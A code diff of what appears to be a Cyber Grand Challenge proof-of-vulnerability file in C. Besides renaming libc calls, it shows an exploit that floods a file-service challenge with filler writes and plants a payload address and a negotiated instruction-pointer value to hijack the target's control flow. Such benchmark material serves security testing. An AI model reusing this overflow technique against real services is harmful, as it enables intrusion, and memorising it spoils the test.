@@ -27,15 +27,15 @@ void buffer_append(uint8_t* data, uint32_t data_len)
 {
   if (buffer_len + data_len > buffer_cap)
   {
-    uint8_t* new = malloc(buffer_cap * 2);
-    memcpy(new, buffer, buffer_len);
-    free(buffer);
+    uint8_t* new = __libpov_malloc(buffer_cap * 2);
+    __libpov_memcpy(new, buffer, buffer_len);
+    __libpov_free(buffer);
 
     buffer_cap *= 2;
     buffer = new;
   }
 
-  memcpy(buffer + buffer_len, data, data_len);
+  __libpov_memcpy(buffer + buffer_len, data, data_len);
   buffer_len += data_len;
 }
 
@@ -61,14 +61,14 @@ int uc(int c, const char* path)
   size_t s = 0;
   int mode = 0;
 
-  size_t slen = strlen(path) + 1;
+  size_t slen = __libpov_strlen(path) + 1;
   s += sizeof(slen) + slen;
   s += sizeof(mode);
 
-  uint8_t* out = malloc(s);
-  memcpy(out, &slen, sizeof(slen));
-  memcpy(out + sizeof(slen), path, slen);
-  memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));
+  uint8_t* out = __libpov_malloc(s);
+  __libpov_memcpy(out, &slen, sizeof(slen));
+  __libpov_memcpy(out + sizeof(slen), path, slen);
+  __libpov_memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));
 
   if (c)
     return send_req(CREAT_F_NUM, out, s);
@@ -81,7 +81,7 @@ int creat(const char* path)
   return uc(1, path);
 }
 
-int unlink(const char* path)
+int __cgc_unlink(const char* path)
 {
   return uc(0, path);
 }
@@ -90,18 +90,18 @@ int open(const char* path, int flags, int mode)
 {
   size_t s = 0;
 
-  size_t slen = strlen(path) + 1;
+  size_t slen = __libpov_strlen(path) + 1;
   s += sizeof(slen);
   s += slen;
   s += sizeof(flags);
   s += sizeof(mode);
 
-  uint8_t* out = malloc(s);
+  uint8_t* out = __libpov_malloc(s);
 
-  memcpy(out, &slen, sizeof(slen));
-  memcpy(out + sizeof(slen), path, slen);
-  memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
-  memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));
+  __libpov_memcpy(out, &slen, sizeof(slen));
+  __libpov_memcpy(out + sizeof(slen), path, slen);
+  __libpov_memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
+  __libpov_memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));
 
   return send_req(OPEN_F_NUM, out, s);
 }
@@ -119,12 +119,12 @@ int rw(int r, int fd, size_t count, uint8_t* data)
     s += count;
   }
 
-  memcpy(out, dumb(&fd), sizeof(fd));
-  memcpy(out + sizeof(fd), dumb(&count), sizeof(count));
+  __libpov_memcpy(out, dumb(&fd), sizeof(fd));
+  __libpov_memcpy(out + sizeof(fd), dumb(&count), sizeof(count));
 
   if (data)
   {
-    memcpy(out + sizeof(fd) + sizeof(count), data, count);
+    __libpov_memcpy(out + sizeof(fd) + sizeof(count), data, count);
   }
 
   if (r)
@@ -133,12 +133,12 @@ int rw(int r, int fd, size_t count, uint8_t* data)
     return send_req(WRITE_F_NUM, out, s);
 }
 
-int read(int fd, size_t count)
+int __cgc_read(int fd, size_t count)
 {
   return rw(1, fd, count, NULL);
 }
 
-int write(int fd, size_t count, uint8_t* data)
+int __cgc_write(int fd, size_t count, uint8_t* data)
 {
   return rw(0, fd, count, dumb(data));
 }
@@ -148,14 +148,14 @@ int close(int fd)
   size_t s = 0;
 
   s += sizeof(fd);
-  uint8_t* out = malloc(s);
+  uint8_t* out = __libpov_malloc(s);
 
-  memcpy(out, dumb(&fd), sizeof(fd));
+  __libpov_memcpy(out, dumb(&fd), sizeof(fd));
 
   return send_req(CLOSE_F_NUM, out, s);
 }
 
-int lseek(int fd, ssize_t offset, int whence)
+int __cgc_lseek(int fd, ssize_t offset, int whence)
 {
   size_t s = 0;
 
@@ -163,10 +163,10 @@ int lseek(int fd, ssize_t offset, int whence)
   s += sizeof(offset);
   s += sizeof(whence);
 
-  uint8_t* out = malloc(s);
-  memcpy(out, dumb(&fd), sizeof(fd));
-  memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
-  memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));
+  uint8_t* out = __libpov_malloc(s);
+  __libpov_memcpy(out, dumb(&fd), sizeof(fd));
+  __libpov_memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
+  __libpov_memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));
 
   return send_req(LSEEK_F_NUM, out, s);
 }
@@ -174,7 +174,7 @@ int lseek(int fd, ssize_t offset, int whence)
 
 int main(void)
 {
-    buffer = malloc(buffer_cap);
+    buffer = __libpov_malloc(buffer_cap);
     type1_vals t1;
     type1_negotiate(0xfefefefe, 0xfefefefe, 7, &t1);
 
@@ -185,20 +185,20 @@ int main(void)
     open("/poop", APPEND | RDWR, 0);
     open("/poop", APPEND | RDWR, 0);
     close(0);
-    unlink("/poop");
+    __cgc_unlink("/poop");
 
     void* payload_addr_addr = "\x1c\x37\xe4\xb7";
 
     uint8_t all_filler_no_killer[4];
-    memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
+    __libpov_memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
     for (size_t i = 0; i < 32768; ++i)
     {
-      write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
+      __cgc_write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
     }
-    write(1, sizeof(uint32_t), dumb(payload_addr_addr));
-    write(1, sizeof(uint32_t), dumb(&t1.ipval));
+    __cgc_write(1, sizeof(uint32_t), dumb(payload_addr_addr));
+    __cgc_write(1, sizeof(uint32_t), dumb(&t1.ipval));
 
-    lseek(1, t1.regval, 0);
+    __cgc_lseek(1, t1.regval, 0);
     unsigned done = 0xb7eb7e;
     transmit_all(STDOUT, buffer, buffer_len);
     transmit_all(STDOUT, &done, sizeof(done));
